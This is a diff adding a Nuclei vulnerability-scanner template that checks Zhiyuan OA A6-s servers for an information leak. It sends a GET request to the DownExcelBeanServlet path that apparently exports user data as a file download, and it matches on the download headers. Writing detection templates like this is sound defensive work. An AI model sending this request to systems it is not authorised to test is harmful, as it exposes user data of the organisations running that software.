@@ -1,0 +1,27 @@
+id: zhiyuan-oa-info-leak
+
+info:
+  name: Zhiyuan Oa A6-s info Leak
+  author: HuanXiong
+  severity: info
+
+  tags: Information Disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "attachment"
+          - "application/x-msdownload"
+        part: header
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
